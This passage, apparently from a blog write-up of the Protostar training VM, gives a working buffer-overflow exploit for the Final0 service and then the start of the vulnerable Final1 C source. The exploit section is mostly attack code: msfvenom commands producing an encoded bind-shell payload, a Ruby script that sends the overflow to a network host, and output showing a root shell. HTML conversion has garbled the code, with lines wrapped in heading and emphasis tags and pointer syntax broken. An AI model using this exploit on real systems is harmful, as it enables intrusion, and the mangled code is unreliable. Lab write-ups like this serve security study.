</span><span class='line'>PYIIIIIIIIIIQZVTX30VX4AP0A3HH0A00ABAABTAAQ2AB2BB0BBXP8ACJJIVQIKJWZC0SQS0S3Z4BK9M1X0CVHMMP1KQN1B3XER5P39J1RJTPV10PLIM1SZCVV88MMPMYW1S4H3ETH0BFHMMPPCNP3VHMK0MC69SZ7OF8XMMPW9BYKHSXFOFOSCSX3X6O52RI2NK9ZC0P63MYM1X04K8MMPAA</span></code></pre></td></tr></table></div></figure></p>

<p>Exploit:
<figure class='code'><figcaption><span>language:ruby exploit-final0.rb </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
</pre></td><td class='code'><pre><code class='rb'><span class='line'><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;!/us</span><span class="n">r</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">env</span> <span class="n">ruby</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;require &amp;lsquo;socket&amp;rsquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># /usr/share/metasploit-framework/msfelfscan -j eax final0&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;[</span><span class="n">final0</span><span class="o">]&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;0x08048d5f call eax&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mh">0x0804992b</span> <span class="n">call</span> <span class="n">eax</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;0x08054f4b call eax&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="mh">0x08054f4b</span> <span class="n">call</span> <span class="n">eax</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;root@kali32:~# /us</span><span class="n">r</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">metasploit</span><span class="o">-</span><span class="n">framework</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">pattern_offset</span><span class="o">.</span><span class="n">rb</span> <span class="mh">0x72413772</span><span class="o">&lt;</span><span class="sr">/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;h1&gt;[*] Exact match at offset 532&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">root</span><span class="vi">@kali32</span><span class="ss">:~</span><span class="c1"># /usr/share/metasploit-framework/msfvenom -p linux/x86/shell_bind_tcp LPORT=2449 -e x86/alpha_upper -b &amp;lsquo;\x0a\x0d&amp;rsquo; BufferRegister=EAX -f ruby&lt;/h1&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">buf</span> <span class="o">=</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x50</span><span class="p">\</span><span class="n">x59</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x51</span><span class="p">\</span><span class="n">x5a</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x56</span><span class="p">\</span><span class="n">x54</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x56</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x34</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x48</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x48</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x54</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x51</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x32</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x32</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x38</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x43</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x36</span><span class="p">\</span><span class="n">x51</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x4b</span><span class="p">\</span><span class="n">x4c</span><span class="p">\</span><span class="n">x37</span><span class="p">\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x43</span><span class="p">\</span><span class="n">x36</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x50</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x43</span><span class="p">\</span><span class="n">x56</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x43</span><span class="p">\</span><span class="n">x5a</span><span class="p">\</span><span class="n">x53</span><span class="p">\</span><span class="n">x32</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x59</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x48</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x33</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x56</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x4b</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x4e</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x48</span><span class="p">\</span><span class="n">x54</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x42</span><span class="p">\</span><span class="n">x35</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x53</span><span class="p">\</span><span class="n">x39</span><span class="p">\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x32</span><span class="p">\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x32</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x46</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x56</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x30</span><span class="p">\</span><span class="n">x4c</span><span class="p">\</span><span class="n">x49</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x52</span><span class="p">\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x42</span><span class="p">\</span><span class="n">x46</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x30</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x59</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x51</span><span class="p">\</span><span class="n">x44</span><span class="p">\</span><span class="n">x44</span><span class="p">\</span><span class="n">x38</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x55</span><span class="p">\</span><span class="n">x54</span><span class="p">\</span><span class="n">x4e</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x32</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x46</span><span class="p">\</span><span class="n">x38</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x43</span><span class="p">\</span><span class="n">x4e</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x45</span><span class="p">\</span><span class="n">x36</span><span class="p">\</span><span class="n">x38</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x30</span><span class="p">\</span><span class="n">x5a</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x36</span><span class="p">\</span><span class="n">x39</span><span class="p">\</span><span class="n">x53</span><span class="p">\</span><span class="n">x5a</span><span class="p">\</span><span class="n">x47</span><span class="p">\</span><span class="n">x4f</span><span class="p">\</span><span class="n">x50</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x48</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x4b</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x30</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x59</span><span class="p">\</span><span class="n">x32</span><span class="p">\</span><span class="n">x59</span><span class="p">\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x45</span><span class="p">\</span><span class="n">x38</span><span class="p">\</span><span class="n">x36</span><span class="p">\</span><span class="n">x4f</span><span class="p">\</span><span class="n">x56</span><span class="p">\</span><span class="n">x4f</span><span class="p">\</span><span class="n">x32</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x53</span><span class="p">\</span><span class="n">x53</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x35</span><span class="p">\</span><span class="n">x38</span><span class="p">\</span><span class="n">x46</span><span class="p">\</span><span class="n">x4f</span><span class="p">\</span><span class="n">x45</span><span class="p">\</span><span class="n">x32</span><span class="p">\</span><span class="n">x53</span><span class="p">\</span><span class="n">x59</span><span class="p">\</span><span class="n">x32</span><span class="p">\</span><span class="n">x4e</span><span class="p">\</span><span class="n">x4d</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x59</span><span class="p">\</span><span class="n">x4a</span><span class="p">\</span><span class="n">x43</span><span class="p">\</span><span class="n">x36</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x56</span><span class="p">\</span><span class="n">x33</span><span class="p">\</span><span class="n">x4b</span><span class="p">\</span><span class="n">x39</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x31</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x44</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span> <span class="o">+</span>
</span><span class='line'><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;\</span><span class="n">x4b</span><span class="p">\</span><span class="n">x58</span><span class="p">\</span><span class="n">x4d</span><span class="p">\</span><span class="n">x4b</span><span class="p">\</span><span class="n">x30</span><span class="p">\</span><span class="n">x41</span><span class="p">\</span><span class="n">x41</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;exploit = buf + &amp;ldquo;A&amp;rdquo; * (532 - buf.length)</span>
</span><span class='line'><span class="sr">exploit &amp;lt;&amp;lt; [0x08048d5f].pack(&amp;ldquo;V&amp;rdquo;)&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">host</span> <span class="o">=</span> <span class="no">ARGV</span><span class="o">[</span><span class="mi">0</span><span class="o">]</span>
</span><span class='line'><span class="n">host</span> <span class="o">||=</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="mi">192</span><span class="o">.</span><span class="mi">168</span><span class="o">.</span><span class="mi">80</span><span class="o">.</span><span class="mi">154</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;</span><span class="sr">/p&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="sr">&lt;p&gt;puts &amp;ldquo;Using host: </span><span class="si">#{</span><span class="n">host</span><span class="si">}</span><span class="sr">&amp;rdquo;&lt;/</span><span class="nb">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="nb">p</span><span class="o">&gt;</span><span class="n">s</span> <span class="o">=</span> <span class="no">TCPSocket</span><span class="o">.</span><span class="n">new</span> <span class="n">host</span><span class="p">,</span> <span class="mi">2995</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">puts</span><span class="p">(</span><span class="n">exploit</span><span class="p">)</span>
</span><span class='line'><span class="n">s</span><span class="o">.</span><span class="n">close</span>
</span></code></pre></td></tr></table></div></figure></p>

<p><figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>user@protostar:/tmp$ ./exploit-final0.rb
</span><span class='line'>Using host: 192.168.80.154&lt;/p>
</span><span class='line'>
</span><span class='line'>&lt;p>user@protostar:/tmp$ nc 0 2449
</span><span class='line'>id
</span><span class='line'>uid=0(root) gid=0(root) groups=0(root)</span></code></pre></td></tr></table></div></figure></p>

<h2>Protostar Final1</h2>

<p><figure class='code'><figcaption><span>final1.c </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
</pre></td><td class='code'><pre><code class='c'><span class='line'><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;..</span><span class="o">/</span><span class="n">common</span><span class="o">/</span><span class="n">common</span><span class="p">.</span><span class="n">c</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">include</span> <span class="o">&amp;</span><span class="n">lt</span><span class="p">;</span><span class="n">syslog</span><span class="p">.</span><span class="n">h</span><span class="o">&gt;&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">NAME</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">final1</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">UID</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">GID</span> <span class="mi">0</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">h1</span><span class="o">&gt;</span><span class="n">define</span> <span class="n">PORT</span> <span class="mi">2994</span><span class="o">&lt;/</span><span class="n">h1</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">char</span> <span class="n">username</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span>
</span><span class='line'><span class="kt">char</span> <span class="n">hostname</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">logit</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">pw</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">512</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">snprintf</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">buf</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">Login</span> <span class="n">from</span> <span class="o">%</span><span class="n">s</span> <span class="n">as</span> <span class="p">[</span><span class="o">%</span><span class="n">s</span><span class="p">]</span> <span class="n">with</span> <span class="n">password</span> <span class="p">[</span><span class="o">%</span><span class="n">s</span><span class="p">]</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="n">hostname</span><span class="p">,</span> <span class="n">username</span><span class="p">,</span> <span class="n">pw</span><span class="p">);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">syslog</span><span class="p">(</span><span class="n">LOG_USER</span><span class="o">|</span><span class="n">LOG_DEBUG</span><span class="p">,</span> <span class="n">buf</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">trim</span><span class="p">(</span><span class="kt">char</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">str</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">\</span><span class="n">r</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">&lt;</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'>  <span class="n">q</span> <span class="o">=</span> <span class="n">strchr</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">lsquo</span><span class="p">;</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rsquo</span><span class="p">;);</span>
</span><span class='line'>  <span class="k">if</span><span class="p">(</span><span class="n">q</span><span class="p">)</span> <span class="o">&lt;/</span><span class="n">em</span><span class="o">&gt;</span><span class="n">q</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span><span class="kt">void</span> <span class="n">parser</span><span class="p">()</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="kt">char</span> <span class="n">line</span><span class="p">[</span><span class="mi">128</span><span class="p">];</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;[</span><span class="n">final1</span><span class="p">]</span> <span class="err">$</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span><span class="o">&lt;/</span><span class="n">p</span><span class="o">&gt;</span>
</span><span class='line'>
</span><span class='line'><span class="o">&lt;</span><span class="n">p</span><span class="o">&gt;</span>  <span class="k">while</span><span class="p">(</span><span class="n">fgets</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">line</span><span class="p">)</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="n">stdin</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>      <span class="n">trim</span><span class="p">(</span><span class="n">line</span><span class="p">);</span>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">username</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mi">9</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="n">strcpy</span><span class="p">(</span><span class="n">username</span><span class="p">,</span> <span class="n">line</span><span class="o">+</span><span class="mi">9</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="n">strncmp</span><span class="p">(</span><span class="n">line</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">login</span> <span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;,</span> <span class="mi">6</span><span class="p">)</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">if</span><span class="p">(</span><span class="n">username</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>              <span class="n">printf</span><span class="p">(</span><span class="o">&amp;</span><span class="n">ldquo</span><span class="p">;</span><span class="n">invalid</span> <span class="n">protocol</span><span class="err">\</span><span class="n">n</span><span class="o">&amp;</span><span class="n">rdquo</span><span class="p">;);</span>
</span><span class='line'>          <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
